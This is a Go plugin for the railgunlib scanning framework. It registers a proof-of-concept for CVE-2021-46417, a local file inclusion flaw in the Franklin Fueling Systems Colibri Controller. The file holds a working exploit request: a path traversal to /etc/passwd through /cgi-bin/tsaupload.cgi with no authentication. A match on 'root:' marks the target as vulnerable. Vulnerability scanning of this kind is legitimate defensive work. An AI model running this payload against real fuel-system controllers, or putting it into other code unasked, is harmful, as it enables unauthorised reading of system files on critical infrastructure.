package poc_Franklinfueling

import (
	"github.com/lz520520/railgunlib/pkg/register/poc_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/poc_model"
	"github.com/lz520520/railgunlib/pkg/templates/poc_templates"
	"strings"
)

type Poc_CVE_2021_46417 struct {
	poc_templates.PocTemplate
}

func (self *Poc_CVE_2021_46417) Poc1() (pocResult poc_model.PocPerPayloadResult) {
	// 默认配置
	pocResult.Status = false
	headers := self.GetInitPocHeaders()
	resp := self.HttpGetWithoutRedirect(self.AddUri(self.Params.Target, "/cgi-bin/tsaupload.cgi?file_name=../../../../../../etc/passwd&password="), headers)
	if resp.Err != nil {
		return
	}
	if strings.Contains(resp.Body, "root:") {
		pocResult.Status = true
	}
	//"{\"success\":false,\"msg\":\"Verification failure\"}"

	return
}

func init() {
	registerMsg := poc_register.PocRegisterMsg{Msg: poc_model.PocMsg{
		Name:     "Franklin Fueling Systems Colibri Controller Module - Local File Inclusion",
		Author:   "Henry4E36",
		Time:     "2022-05-18",
		Range:    "",
		ID:       "CVE-2021-46417",
		Describe: "Franklin Fueling Systems Colibri Controller Module - Local File Inclusion",
		VulType:  common.VulUnauth,
	},
		Proto: poc_model.PocHTTP,
	}
	poc_register.PocStructRegister(&Poc_CVE_2021_46417{}, registerMsg)
}
